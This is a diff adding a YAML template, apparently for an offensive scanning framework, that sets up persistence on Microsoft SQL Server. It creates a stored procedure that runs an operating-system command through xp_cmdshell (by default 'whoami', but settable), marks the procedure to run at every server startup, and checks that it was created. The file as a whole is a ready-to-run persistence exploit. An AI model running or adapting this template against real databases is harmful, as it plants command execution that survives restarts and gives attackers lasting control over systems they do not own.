@@ -1,0 +1,27 @@
+id: mssql-startup-proc-persist
+service: [mssql]
+variables:
+  proc_name: zombie_startup
+  cmd: whoami
+info:
+  name: MSSQL Startup Stored Procedure Persistence
+  severity: critical
+  tags: mssql,exploit,persist,startup
+
+services:
+  - ops:
+      - db: "USE master"
+      - db: "CREATE PROCEDURE [dbo].[{{proc_name}}] AS EXEC xp_cmdshell '{{cmd}}'"
+      - db: "EXEC sp_procoption @ProcName = '{{proc_name}}', @OptionName = 'startup', @OptionValue = 'on'"
+      - db: "SELECT 'proc_created=' + CASE WHEN OBJECT_ID('dbo.{{proc_name}}', 'P') IS NOT NULL THEN 'yes' ELSE 'no' END"
+        name: proc_status
+    matchers:
+      - type: word
+        part: proc_status
+        words: ["proc_created=yes"]
+    extractors:
+      - type: regex
+        name: mssql_startup_proc_status
+        part: proc_status
+        regex: ['(?m)^proc_created=(yes|no)']
+        group: 1
